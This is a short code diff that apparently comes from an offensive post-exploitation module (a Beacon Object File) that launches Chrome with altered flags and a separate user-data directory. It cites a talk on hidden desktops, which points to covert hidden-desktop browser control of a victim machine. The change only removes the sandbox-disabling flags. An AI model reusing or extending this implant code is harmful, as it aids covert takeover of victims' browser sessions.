@@ -168,7 +168,7 @@ VOID WINAPI BofMain( PBAPI_TABLE BeaconApi, PVOID Argv, INT Argc )
     strcatA( chromePath, "\\Google\\Chrome\\Application\\chrome.exe" );
 
     // https://deepsec.net/docs/Slides/2017/Who_Hid_My_Desktop_Or_Safran_Pavel_Asinovsky.pdf
-    strcatA( chromeArgs, "--no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --disable-accelerated-layers --disable-accelerated-plugins --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --allow-profiles-outside-user-dir --user-data-dir=" );
+    strcatA( chromeArgs, "--disable-3d-apis --disable-gpu --disable-d3d11 --disable-accelerated-layers --disable-accelerated-plugins --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --allow-profiles-outside-user-dir --user-data-dir=" );
 
     Api.SHGetFolderPathA( NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdataDir );
     strcatA( userDataPath, appdataDir );
